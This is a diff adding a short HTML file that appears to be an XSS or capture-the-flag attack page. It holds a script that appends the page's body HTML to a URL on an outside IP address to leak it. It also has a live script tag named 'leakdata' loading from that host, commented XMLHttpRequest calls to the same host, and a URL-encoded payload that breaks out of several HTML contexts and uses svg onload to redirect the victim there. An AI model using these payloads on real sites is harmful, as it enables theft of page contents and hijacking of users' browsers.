@@ -1,0 +1,37 @@
+<html>
+
+
+<head>
+<!-- 	<script type="text/javascript">
+		var my_awesome_script = document.createElement('script');
+		var a = "http://140.112.30.39:10025/xx";
+		a = a.replace('xx',document.body.innerHTML);
+		my_awesome_script.setAttribute('src',a);
+		document.head.appendChild(my_awesome_script);
+	</script>
+ -->	<script name="leakdata" type="text/javascript" src="http://140.112.30.39:10025/" charset="utf-8"></script>
+
+
+</head>
+<body>
+</body>
+<!--
+<script name="leakdata" type="text/javascript" src="http://140.112.30.39:12005/" charset="utf-8">
+	
+	console.log(document.getElementsByName('leakdata'));
+
+</script>
+
+<script>
+
+const Http = new XMLHttpRequest();
+const url='http://140.112.30.39:12005';
+Http.open("GET", url);
+Http.send();
+Http.onreadystatechange=(e)=>{
+console.log(Http.responseText)
+}
+</script>
+-->
+
+http://localhost/server/10.php?c=%3C/script%3E%22--%3E%3C/title%3E%3C/style%3E%3C/xmp%3E%3Csvg/onload=%22document.location=%27http://140.112.30.39:12005/jiz%27%22%3E
